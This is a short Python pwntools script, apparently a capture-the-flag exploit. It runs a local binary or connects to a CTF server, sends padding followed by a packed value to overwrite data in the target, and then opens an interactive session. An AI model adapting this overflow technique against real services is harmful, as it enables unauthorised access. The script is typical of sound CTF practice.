#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import struct
from pwn import *

context.log_level = 'debug'

fn = './test'

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('ctf.acdxvfsvd.net', 1926)

io.sendlineafter('?\n', '2000')
io.sendlineafter('?\n', 'a' * 8 + struct.pack('<H', 1926))

io.interactive()
